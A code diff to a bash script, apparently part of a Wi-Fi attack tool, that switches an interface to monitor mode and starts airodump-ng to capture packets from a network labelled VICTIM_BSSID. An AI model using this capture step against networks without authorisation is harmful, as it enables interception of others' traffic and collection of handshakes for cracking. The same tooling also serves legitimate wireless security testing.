@@ -39,19 +39,20 @@ MON="${IFACE1}mon"
 
 do_it()
 {
-    if [[ -z $(ip addr | grep -i "$MON") ]]; then
-        iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
+    if [[ -z $(ip addr | grep -i "${MON}") ]]; then
+        iwconfig $IFACE1 mode monitor # Force managed mode upon wlan because airmon wont do this
         [[ -z $(ip addr | grep -i "${MON}") ]] && airmon-zc start $IFACE1
     fi
-      if [[ -f ${SESSIONFOLDER}/${VICTIM_BSSID}* ]]; then #verify file integritys
+
+    if [[ -f ${SESSIONFOLDER}/${VICTIM_BSSID}* ]]; then #verify file integritys
         read -p "${VICTIM_BSSID}*.cap exists already. Continuing will remove the file. Continue anyways? [y/n]" option
         if [[ $option != [Yy] ]]; then
             exit 1
         else
            rm ${SESSIONFOLDER}/${VICTIM_BSSID}*
         fi
-	xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN --output-format pcap -w ${SESSIONFOLDER}/$VICTIM_BSSID $MON &>/dev/null &
     fi
+    xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN --output-format pcap -w ${SESSIONFOLDER}/$VICTIM_BSSID $MON &>/dev/null &
     keepalive
 }
 
